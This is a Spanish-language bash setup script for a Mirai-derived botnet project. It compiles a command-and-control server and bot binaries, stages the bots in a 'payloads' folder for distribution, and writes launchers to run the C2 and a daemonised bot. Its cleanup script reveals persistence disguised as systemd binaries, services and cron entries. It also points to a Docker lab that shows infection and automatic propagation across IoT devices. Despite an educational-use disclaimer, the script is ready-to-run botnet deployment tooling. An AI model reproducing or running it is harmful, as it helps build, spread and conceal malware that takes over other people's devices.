#!/bin/bash
# Setup Completo - Arquitectura Distribuida
# Prepara todo el entorno para testing y demostración

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     SETUP COMPLETO - ARQUITECTURA DISTRIBUIDA MIRAI          ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Check if we're in the right directory
if [ ! -f "distributed_scanner.h" ]; then
    echo -e "${RED}[ERROR]${NC} No estás en el directorio correcto"
    echo "Ejecuta este script desde: ~/Downloads/mirai/"
    exit 1
fi

echo -e "${CYAN}[*]${NC} Verificando dependencias..."

# Check for required packages
MISSING_DEPS=()

if ! command -v gcc &> /dev/null; then
    MISSING_DEPS+=("gcc")
fi

if ! dpkg -l | grep -q libssl-dev; then
    MISSING_DEPS+=("libssl-dev")
fi

if ! dpkg -l | grep -q libjson-c-dev; then
    MISSING_DEPS+=("libjson-c-dev")
fi

if [ ${#MISSING_DEPS[@]} -gt 0 ]; then
    echo -e "${YELLOW}[!]${NC} Dependencias faltantes: ${MISSING_DEPS[*]}"
    echo -e "${CYAN}[*]${NC} Instalando..."
    sudo apt update
    sudo apt install -y gcc libssl-dev libjson-c-dev build-essential
fi

echo -e "${GREEN}✓${NC} Dependencias OK"
echo ""

# Compile everything
echo -e "${CYAN}[*]${NC} Compilando proyecto..."
chmod +x compile_distributed.sh
./compile_distributed.sh

if [ $? -ne 0 ]; then
    echo -e "${RED}[ERROR]${NC} Compilación fallida"
    exit 1
fi

echo ""
echo -e "${GREEN}✓${NC} Compilación exitosa"
echo ""

# Create directories
echo -e "${CYAN}[*]${NC} Creando estructura de directorios..."
mkdir -p logs
mkdir -p payloads
mkdir -p evidence

# Copy binaries to payloads
cp higurashi_immortal payloads/ 2>/dev/null || true
cp bot_vivi_v3 payloads/ 2>/dev/null || true

echo -e "${GREEN}✓${NC} Directorios creados"
echo ""

# Generate self-signed SSL certificates if they don't exist
if [ ! -f "cert.pem" ] || [ ! -f "key.pem" ]; then
    echo -e "${CYAN}[*]${NC} Generando certificados SSL..."
    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \
        -subj "/C=US/ST=State/L=City/O=Research/CN=localhost" 2>/dev/null
    
    chmod 600 key.pem
    chmod 644 cert.pem
    
    echo -e "${GREEN}✓${NC} Certificados SSL generados"
else
    echo -e "${GREEN}✓${NC} Certificados SSL ya existen"
fi

echo ""

# Make scripts executable
echo -e "${CYAN}[*]${NC} Configurando permisos..."
chmod +x *.sh 2>/dev/null || true
chmod +x c2_master_v3 2>/dev/null || true
chmod +x higurashi_immortal 2>/dev/null || true
chmod +x bot_vivi_v3 2>/dev/null || true

echo -e "${GREEN}✓${NC} Permisos configurados"
echo ""

# Create quick start scripts
echo -e "${CYAN}[*]${NC} Creando scripts de acceso rápido..."

# C2 starter
cat > start_c2.sh << 'EOF'
#!/bin/bash
echo "[*] Iniciando C2 Master..."
echo "[*] Dashboard estará disponible en la terminal"
echo ""
./c2_master_v3
EOF
chmod +x start_c2.sh

# Bot starter
cat > start_bot.sh << 'EOF'
#!/bin/bash
if [ "$1" == "--debug" ]; then
    echo "[*] Iniciando bot en modo DEBUG (foreground)..."
    ./higurashi_immortal --no-daemon
else
    echo "[*] Iniciando bot en modo DAEMON (background)..."
    ./higurashi_immortal
    echo "[*] Bot ejecutándose en background"
    echo "[*] Verificar con: ps aux | grep higurashi"
fi
EOF
chmod +x start_bot.sh

# Cleanup script
cat > cleanup.sh << 'EOF'
#!/bin/bash
echo "[*] Limpiando procesos y archivos..."

# Kill processes
killall -9 c2_master_v3 2>/dev/null || true
killall -9 higurashi_immortal 2>/dev/null || true
killall -9 bot_vivi_v3 2>/dev/null || true

# Clean persistence
crontab -l 2>/dev/null | grep -v higurashi | crontab - 2>/dev/null || true
sudo rm -f /usr/bin/systemd-* /usr/sbin/systemd-* 2>/dev/null || true
sudo rm -f /tmp/.systemd-* /var/tmp/.systemd-* 2>/dev/null || true
sudo systemctl list-units | grep systemd- | awk '{print $1}' | xargs -r sudo systemctl disable 2>/dev/null || true
sudo rm -f /etc/systemd/system/systemd-*.service 2>/dev/null || true
sudo systemctl daemon-reload 2>/dev/null || true

echo "[✓] Limpieza completa"
EOF
chmod +x cleanup.sh

echo -e "${GREEN}✓${NC} Scripts de acceso rápido creados"
echo ""

# Summary
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo -e "${GREEN}✓ SETUP COMPLETO${NC}"
echo ""
echo "┌─────────────────────────────────────────────────────────────┐"
echo "│ ARCHIVOS GENERADOS                                          │"
echo "├─────────────────────────────────────────────────────────────┤"
echo "│                                                             │"
echo "│ Binarios:                                                   │"
echo "│   • c2_master_v3       - Servidor C2 (pasivo)              │"
echo "│   • higurashi_immortal - Bot con scanner distribuido       │"
echo "│   • bot_vivi_v3        - MITM + Scanner                    │"
echo "│                                                             │"
echo "│ Certificados SSL:                                           │"
echo "│   • cert.pem           - Certificado público               │"
echo "│   • key.pem            - Llave privada                     │"
echo "│                                                             │"
echo "│ Scripts de control:                                         │"
echo "│   • start_c2.sh        - Iniciar C2                        │"
echo "│   • start_bot.sh       - Iniciar bot                       │"
echo "│   • cleanup.sh         - Limpieza completa                 │"
echo "│   • test_lab.sh        - Laboratorio Docker                │"
echo "│                                                             │"
echo "│ Directorios:                                                │"
echo "│   • logs/              - Logs del sistema                  │"
echo "│   • payloads/          - Binarios para distribuir          │"
echo "│   • evidence/          - Capturas para el ensayo           │"
echo "│                                                             │"
echo "└─────────────────────────────────────────────────────────────┘"
echo ""

# Next steps
echo -e "${CYAN}PRÓXIMOS PASOS:${NC}"
echo ""
echo "1. TESTING LOCAL (MÁS SEGURO):"
echo "   ${GREEN}./test_lab.sh${NC}"
echo "   Inicia un laboratorio Docker completamente aislado"
echo ""
echo "2. DEMO CON C2 REAL:"
echo "   ${GREEN}./start_c2.sh${NC}"
echo "   Inicia el servidor C2 en esta máquina"
echo ""
echo "3. CONECTAR UN BOT:"
echo "   ${GREEN}./start_bot.sh --debug${NC}"
echo "   Inicia un bot en modo debug (foreground)"
echo ""
echo "4. LIMPIEZA:"
echo "   ${GREEN}./cleanup.sh${NC}"
echo "   Detiene todos los procesos y limpia archivos"
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Quick tutorial
echo -e "${YELLOW}TIP:${NC} Para una demo rápida sin riesgo:"
echo ""
echo "  ${GREEN}./test_lab.sh${NC}"
echo "  Opción [1] - Iniciar lab"
echo "  Opción [3] - Infectar bot"
echo "  Opción [4] - Ver resultados"
echo ""
echo "  Esto crea 4 dispositivos IoT vulnerables en Docker"
echo "  y demuestra la propagación automática en 5 minutos."
echo ""

# Documentation
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo -e "${CYAN}DOCUMENTACIÓN:${NC}"
echo ""
echo "  • README_DISTRIBUIDO.md         - Guía principal"
echo "  • ARQUITECTURA_DISTRIBUIDA.md   - Explicación técnica"
echo "  • GUIA_DEMO.md                  - Cómo hacer la demo"
echo "  • DIAGRAMA_ARQUITECTURA.txt     - Diagramas para ensayo"
echo "  • RESUMEN_CAMBIOS.md            - Changelog completo"
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Final warning
echo -e "${RED}⚠️  IMPORTANTE:${NC}"
echo ""
echo "  Este proyecto es para PROPÓSITOS EDUCATIVOS únicamente."
echo ""
echo "  ✅ PERMITIDO:"
echo "     - Laboratorio Docker local"
echo "     - Dispositivos con permiso explícito"
echo "     - Documentación académica"
echo ""
echo "  ❌ PROHIBIDO:"
echo "     - Infectar dispositivos sin autorización"
echo "     - Uso en producción real"
echo "     - Actividades ilegales"
echo ""

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo -e "${GREEN}¡Setup completo! Listo para comenzar.${NC}"
echo ""
